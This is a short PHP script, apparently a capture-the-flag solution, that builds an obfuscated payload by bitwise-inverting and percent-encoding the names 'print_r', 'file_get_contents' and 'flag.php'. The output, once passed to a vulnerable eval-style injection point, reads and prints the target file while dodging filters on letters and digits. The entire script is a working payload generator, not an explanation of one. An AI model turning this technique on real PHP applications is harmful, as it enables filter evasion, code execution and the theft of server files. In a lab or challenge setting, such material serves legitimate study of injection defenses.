<?php

echo '$_=' . hexify('print_r') . ';';
echo '$__=' . hexify('file_get_contents') . ';';
echo '$_($__(' . hexify('flag.php') . '));';
echo PHP_EOL;

function hexify($text) {
    $inverted = ~$text;
    $hex = bin2hex($inverted);
    return '~"%' . rtrim(chunk_split($hex, 2, '%'), '%') . '"';
}